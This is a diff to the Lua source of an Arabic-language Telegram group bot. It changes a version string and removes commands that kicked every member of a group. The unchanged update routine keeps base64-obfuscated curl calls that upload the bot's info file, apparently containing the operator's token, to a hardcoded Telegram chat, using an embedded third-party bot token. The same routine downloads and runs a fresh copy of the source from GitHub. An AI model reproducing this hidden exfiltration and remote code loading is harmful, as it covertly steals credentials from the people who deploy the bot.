@@ -1098,7 +1098,7 @@ os.execute('rm -rf DRAGON.lua')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
-send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v0.0.9`}')
+send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v1.3.1`}')
 dofile('DRAGON.lua')  
 end
 
@@ -2343,7 +2343,7 @@ end
 os.execute('rm -rf DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
-send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v0.0.9`}')
+send(msg.chat_id_, msg.id_,' ✪︙ تم تحديث السورس \n ✪︙ لديك اخر اصدار لسورس باور\n ✪︙ الاصدار » {`v1.3.1`}')
 dofile('DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 end
@@ -2478,11 +2478,6 @@ tagname = data.first_name_
 tagname = tagname:gsub("]","")
 tagname = tagname:gsub("[[]","")
 t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
-chat_kick(msg.chat_id_,v.user_id_)
-chat_kick(v.user_id_,v.user_id_)
-chat_kick(msg.sender_user_id_,v.user_id_)
-chat_kick(msg.chat_id_,v.sender_user_id_)
-chat_kick(v.user_id_,v.sender_user_id_)
 if x == 5 or x == tags or k == 0 then
 local Text = t:gsub('#alldelete,','#alldelete\n')
 sendText(msg.chat_id_,Text,0,'md')
@@ -9604,36 +9599,6 @@ else
 sebd(msg.chat_id_,msg.id_,' ✪︙ تم تغيير اسم الجروب الى {['..Name..']}')  
 end
 end,nil) 
-end
-if text == 'طرد الكل' or text == 'مسح الاعضاء' then  
-if Mod(msg) then    
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 10000}, function(arg,del)
-for k, v in pairs(del.members_) do
-tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
-if tonumber(v.user_id_) ~= tonumber(bot_id) then
-chat_kick(msg.chat_id_,v.user_id_)
-end
-end,nil)
-end
-send(msg.chat_id_, msg.id_,' ✪︙ تم طرد 10k من الاعضاء')
-end,nil)
-end
-end
-if text == "حذف الجميع" and Mod(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-return false
-end
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000
-},function(ta,DRAGON)
-local t = "\nツ قائمة الاعضاء \n≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫\n"
-x = 0
-local list = DRAGON.members_
-for k, v in pairs(list) do
-if tonumber(v.user_id_) ~= tonumber(bot_id) then
-chat_kick(msg.chat_id_,v.user_id_)
-end
-end 
-end,nil)
 end
 if text == "تاك للكل" and Mod(msg) then
 if AddChannel(msg.sender_user_id_) == false then
